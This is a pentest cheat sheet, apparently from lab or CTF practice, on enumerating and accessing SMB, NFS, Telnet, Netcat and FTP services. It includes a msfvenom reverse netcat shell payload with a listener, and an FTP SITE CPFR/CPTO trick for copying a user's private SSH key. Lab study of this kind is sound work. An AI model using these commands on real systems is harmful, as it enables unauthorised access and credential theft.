# SMB / FTP / TELNET / NETCAT / NFS NOTES

## SMB (Server Message Block)

SMB is a network file sharing protocol used for shared folders, printers, and communication between systems. Common ports:
- 139 (NetBIOS)
- 445 (SMB)

## Basic SMB Enumeration

# Install enum4linux
git clone https://github.com/CiscoCXSecurity/enum4linux.git

# Help menu
enum4linux -help

# Full enumeration scan
enum4linux -a <ip>

# -a includes:
-U = users
-S = shares
-D = domain info
-P = password policy

## Access SMB Share

# Login to SMB share
smbclient //<ip_address>/<share_name> -U <username> -p 445

# Example
smbclient //10.10.10.10/public -U anonymous

# No password login
smbclient //10.10.10.10/public -N

## List Available Shares

smbclient -L //<TARGET-IP> -U <username>

## Download Files Recursively

smbget -R smb://10.10.10.10/public

# Anonymous download
smbget -R -u= -p= smb://10.10.10.10/public

## SSH Login with Key

ssh -i id_rsa john@10.10.10.10


------------------------------------------------------------

## NFS (Network File System)

NFS allows remote folders to be mounted locally.

## Check Exported Directories

showmount -e <ip>

# Example
showmount -e 10.10.216.69

## Nmap NFS Enumeration

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>

## Mount Remote Directory

sudo mount -t nfs 10.10.216.69:/home/james /tmp/shared

# Now /tmp/shared contains remote files


------------------------------------------------------------

## TELNET

Telnet is an old remote communication protocol used to connect to ports manually.

## Syntax

telnet <ip> <port>

## Example

telnet 10.10.13.114 8012

## Sample Output

Trying 10.10.13.114...
Connected to 10.10.13.114.
Escape character is '^]'.

## Useful Commands in Backdoor Example

.HELP
.RUN ls
.EXIT

## Packet Capture During Ping

sudo tcpdump ip proto \\icmp -i tun0

## Reverse Shell Payload Example

msfvenom -p cmd/unix/reverse_netcat lhost=<your_ip> lport=4444 R

## Listen for Connection

nc -lvnp 4444


------------------------------------------------------------

## NETCAT (nc)

Netcat is used for manual connections, banner grabbing, file transfer, reverse shells, listeners.

## Syntax

nc <ip> <port>

## Example HTTP Request

nc 163.70.146.174 80

GET / HTTP/1.1

## Useful Uses

# Listener
nc -lvnp 4444

# Connect to service
nc <ip> <port>

# Banner grabbing
nc <ip> 21
nc <ip> 22
nc <ip> 80


------------------------------------------------------------

## FTP (File Transfer Protocol)

Used to upload/download files. Common ports:
- 21 Control
- 20 Data

## Anonymous Login

ftp <ip>

Username: anonymous
Password: press enter

## Example

ftp 10.10.54.39

## FTP Commands

ls
pwd
cd
get <file>
put <file>
bye

## Connect with Netcat

nc <ip> 21

## FTP Misconfiguration Example

SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

# Used to copy files if vulnerable server allows it.


------------------------------------------------------------

## Important Ports

21   FTP
22   SSH
23   TELNET
111  NFS RPC
139  SMB NetBIOS
445  SMB Direct


------------------------------------------------------------

## Quick Enumeration Flow

nmap -sV <ip>

enum4linux -a <ip>

smbclient -L //<ip> -U anonymous

showmount -e <ip>

ftp <ip>

telnet <ip> <port>

nc <ip> <port>


------------------------------------------------------------

## Notes

- SMB often allows anonymous shares.
- NFS misconfigurations can expose home directories.
- Telnet is insecure (plain text).
- Netcat is multipurpose and powerful.
- FTP anonymous login is common in labs.
